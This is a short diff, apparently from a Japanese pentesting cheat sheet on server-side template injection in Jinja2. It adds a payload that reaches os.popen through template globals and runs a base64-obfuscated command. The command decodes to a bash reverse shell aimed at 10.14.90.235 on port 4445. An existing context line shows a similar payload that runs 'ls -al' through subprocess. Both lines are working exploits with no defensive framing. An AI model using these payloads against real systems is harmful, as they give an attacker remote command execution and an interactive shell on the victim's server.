@@ -45,6 +45,9 @@ PHP コードを直接実行できる
 # <class '_sitebuiltins._Helper'> を使って、
 # subprocess.open("ls") を実行
 {{"".__class__.__mro__[1].__subclasses__()[157].__repr__.__globals__.get("__builtins__").get("__import__")("subprocess").check_output(["ls", "-al"])}}
+
+# よりスマートな方法
+{{request.application.__globals__.__builtins__.__import__('os').popen('echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjE0LjkwLjIzNS80NDQ1IDA+JjE=|base64 -d|bash').read()}}
 ```
 
 ## SSTImap 自動化
